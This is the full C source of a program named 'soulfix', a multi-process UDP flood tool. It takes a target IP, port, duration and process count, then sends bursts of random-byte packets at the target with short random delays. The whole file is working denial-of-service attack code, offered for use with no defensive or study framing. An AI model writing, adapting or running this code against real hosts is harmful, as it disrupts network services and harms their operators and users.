#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <time.h>

void usage() {
    printf("Usage: ./soulfix ip port time processes\n");
    exit(1);
}

void randomize_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);  // Random byte values (0-255)
    }
}

void attack(char *ip, int port, int duration) {
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime = time(NULL) + duration;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    srand(time(NULL) ^ getpid());  // Unique seed for randomness

    while (time(NULL) <= endtime) {
        int payload_size = (rand() % 800) + 200;  // Random size (200-1000 bytes)
        char payload[payload_size];
        randomize_payload(payload, payload_size);

        sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));

        usleep((rand() % 1000) + 500);  // Random delay (500-1500 microseconds)
    }

    close(sock);
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int processes = atoi(argv[4]);

    printf("Flood started on %s:%d for %d seconds with %d processes\n", ip, port, duration, processes);

    for (int i = 0; i < processes; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("Fork failed");
            exit(1);
        }
        if (pid == 0) {
            attack(ip, port, duration);
        }
    }

    for (int i = 0; i < processes; i++) {
        wait(NULL);
    }

    printf("Attack finished\n");
    return 0;
}
